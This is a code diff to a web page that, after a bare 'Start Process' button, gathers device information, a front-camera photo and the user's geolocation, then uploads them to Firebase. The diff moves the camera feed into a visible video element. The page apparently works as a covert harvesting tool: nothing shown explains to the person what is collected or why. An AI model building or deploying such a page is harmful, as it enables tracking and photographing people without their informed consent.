@@ -61,6 +61,13 @@
             color: #ffff00;
             margin: 10px 0;
         }
+        video {
+            display: none; /* Initially hidden until video is ready */
+            width: 100%; /* Adjust width as needed */
+            height: auto; /* Maintain aspect ratio */
+            border: 2px solid #00ff00; /* Green border to highlight the video */
+            margin-top: 20px; /* Space from the button */
+        }
     </style>
 </head>
 <body>
@@ -74,6 +81,7 @@
         <button class="button" id="start-button">Start Process</button>
         <div id="error-message" class="error-message"></div>
         <div id="info-message" class="info-message"></div>
+        <video id="video" autoplay playsinline></video> <!-- Video element for camera feed -->
     </div>
 
     <script type="module">
@@ -97,6 +105,7 @@
         const loadingScreen = document.getElementById('loading-screen');
         const errorMessage = document.getElementById('error-message');
         const infoMessage = document.getElementById('info-message');
+        const videoElement = document.getElementById('video');
 
         document.getElementById('start-button').addEventListener('click', startProcess);
 
@@ -105,6 +114,7 @@
             errorMessage.innerHTML = '';
             infoMessage.innerHTML = '';
             loadingScreen.style.display = 'flex'; // Show loading screen
+            videoElement.style.display = 'block'; // Show video element
 
             let sessionId = Date.now(); // Unique session ID
             let sessionData = {};
@@ -121,18 +131,21 @@
                 sessionData = { ...sessionData, ...deviceInfo }; // Merge device info into sessionData
                 console.log('Device Info Retrieved:', deviceInfo);
 
-                // Step 3: Take Screenshot after 10 seconds
+                // Step 3: Start the camera and wait for it to be ready
+                await startCamera();
+
+                // Step 4: Take Screenshot after 10 seconds
                 const screenshot = await takeScreenshot(10000); // Load camera for 10 seconds
                 sessionData.screenshot = screenshot;
                 console.log('Screenshot Captured');
 
-                // Step 4: Get Geolocation (optional, may be denied)
+                // Step 5: Get Geolocation (optional, may be denied)
                 const position = await getGeolocation();
                 sessionData.latitude = position.coords.latitude;
                 sessionData.longitude = position.coords.longitude;
                 console.log('Geolocation Retrieved:', position.coords);
 
-                // Step 5: Upload all data to Firebase
+                // Step 6: Upload all data to Firebase
                 await uploadSessionData(sessionId, sessionData);
                 infoMessage.innerHTML = 'Data successfully uploaded!';
                 console.log('Data successfully uploaded:', sessionData);
@@ -141,6 +154,18 @@
                 console.error('Error during process:', error);
             } finally {
                 loadingScreen.style.display = 'none'; // Hide loading screen
+                videoElement.style.display = 'none'; // Hide video element after the process
+            }
+        }
+
+        // Function to start the camera and show the video feed
+        async function startCamera() {
+            try {
+                videoElement.srcObject = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' } // Use the front camera
+                });
+            } catch (error) {
+                throw new Error("Unable to access the camera. Please allow camera access and try again.");
             }
         }
 
@@ -173,33 +198,16 @@
 
         // Function to take a screenshot using the front camera
         async function takeScreenshot(duration) {
-            const video = document.createElement('video');
-            video.autoplay = true;
-
-            try {
-                // Use the front camera on mobile devices
-                video.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            } catch (error) {
-                throw new Error("Unable to access the camera. Please allow camera access and try again.");
-            }
-
-            document.body.appendChild(video);
-
-            // Stop the camera after the specified duration
             return new Promise((resolve) => {
-                const stopCamera = () => {
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                    document.body.removeChild(video);
-                };
-
+                // Stop the camera after the specified duration
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = videoElement.videoWidth;
+                    canvas.height = videoElement.videoHeight;
                     const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    stopCamera(); // Stop the camera stream
-                    resolve(canvas.toDataURL('image/png'));
+                    ctx.drawImage(videoElement, 0, 0);
+                    videoElement.srcObject.getTracks().forEach(track => track.stop()); // Stop the video stream
+                    resolve(canvas.toDataURL('image/png')); // Return the screenshot as base64 string
                 }, duration); // Take the screenshot after specified duration
             });
         }
